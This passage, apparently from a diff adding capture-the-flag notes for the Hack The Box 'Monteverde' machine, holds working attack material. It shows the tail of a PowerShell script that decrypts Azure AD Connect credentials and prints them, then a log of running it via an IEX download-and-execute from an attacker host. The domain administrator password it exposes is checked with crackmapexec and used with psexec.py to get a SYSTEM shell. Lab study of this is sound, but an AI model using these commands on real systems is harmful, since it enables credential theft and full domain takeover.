+$km.GetActiveCredentialKey([ref]$key)
+$key2 = $null
+$km.GetKey(1, [ref]$key2)
+$decrypted = $null
+$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
+
+$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
+$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
+$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}
+
+Write-Host ("Domain: " + $domain.Domain)
+Write-Host ("Username: " + $username.Username)
+Write-Host ("Password: " + $password.Password)
+===================================================================================================================================
+
+COMMANDS and OUTPUT:
+===================================================================================================================================
+*Evil-WinRM* PS C:\Users\mhope\Documents> IEX(New-Object Net.WebClient).downloadString("http://10.10.14.23:8000/decrypt.ps1")
+AD Connect Sync Credential Extract POC (@_xpn_)
+
+Domain: MEGABANK.LOCAL
+Username: administrator
+Password: d0m@in4dminyeah!
+===================================================================================================================================
+
+COMMANDS and OUTPUT:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/monteverde]
+└──╼ $crackmapexec smb 10.10.10.172 -u administrator -p "d0m@in4dminyeah!"
+SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\administrator:d0m@in4dminyeah! (Pwn3d!)
+┌─[✗]─[user@parrot-virtual]─[~/htb/monteverde]
+└──╼ $psexec.py Administrator@10.10.10.172
+Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation
+
+Password:
+[*] Requesting shares on 10.10.10.172.....
+[*] Found writable share ADMIN$
+[*] Uploading file muSEaZng.exe
+[*] Opening SVCManager on 10.10.10.172.....
+[*] Creating service DkBD on 10.10.10.172.....
+[*] Starting service DkBD.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.914]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+===================================================================================================================================
+
+COMMANDS and OUTPUT:
+===================================================================================================================================
+===================================================================================================================================
+
+COMMANDS and OUTPUT:
+===================================================================================================================================
+===================================================================================================================================
+
+COMMANDS and OUTPUT:
+===================================================================================================================================
+===================================================================================================================================
+
+COMMANDS and OUTPUT:
+===================================================================================================================================
+===================================================================================================================================
